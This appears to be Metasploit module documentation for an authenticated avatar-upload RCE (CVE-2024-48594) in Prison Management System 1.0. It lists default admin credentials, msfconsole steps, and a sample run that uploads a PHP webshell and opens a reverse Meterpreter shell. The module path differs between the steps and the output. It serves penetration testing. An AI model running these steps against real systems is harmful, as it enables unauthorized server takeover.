## Vulnerable Application

Prison Management System 1.0 is a PHP application that allows administrators to manage prison records.
The application contains an unrestricted file upload vulnerability (CVE-2024-48594) in the avatar
upload functionality of the add-admin.php endpoint. The application fails to properly validate the
uploaded file type, allowing an authenticated attacker to upload a PHP file and achieve remote code
execution.

The vulnerable application can be downloaded from:
https://www.sourcecodester.com/sql/17287/prison-management-system.html

Installation requires a standard LAMP stack (Linux, Apache, MySQL, PHP).

## Verification Steps

1. Install Prison Management System 1.0 on a target system
2. Start msfconsole
3. Do: `use exploit/multi/http/prison_management_rce`
4. Do: `set RHOSTS <target_ip>`
5. Do: `set RPORT <target_port>`
6. Do: `set SSL true` (if using HTTPS)
7. Do: `set USERNAME <admin_username>`
8. Do: `set PASSWORD <admin_password>`
9. Do: `set LHOST <your_ip>`
10. Do: `run`
11. You should get a shell.

## Options

### USERNAME

The username to authenticate with. Default: `admin`

### PASSWORD

The password to authenticate with. Default: `admin123`

The base path to Prison Management System. Default: `/`

## Scenarios

### Prison Management System 1.0 on Ubuntu 20.04 with Apache

```
msf exploit(linux/http/prison_management_rce) > options

Module options (exploit/linux/http/prison_management_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin123         yes       Password for authentication
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS     192.168.223.103  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      9443             yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to Prison Management System
   USERNAME   admin            yes       Username for authentication
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.45.222   yes       The listen address (an interface may be specified)
   LPORT  9443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP

View the full module info with the info, or info -d command.

msf exploit(linux/http/prison_management_rce) > run
[*] Started reverse TCP handler on 192.168.45.222:9443 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Prison Management System login page detected
[*] Attempting to authenticate as admin...
[+] Successfully authenticated!
[*] Uploading webshell as EXBCiWAs.php...
[+] Webshell uploaded to /uploadImage/Profile/EXBCiWAs.php
[*] Triggering payload execution...
[*] Sending stage (41224 bytes) to 192.168.223.103
[+] Deleted EXBCiWAs.php
[*] Meterpreter session 2 opened (192.168.45.222:9443 -> 192.168.223.103:48250) at 2025-12-26 07:15:02 +0200
meterpreter > getuid
Server username: www-data
```
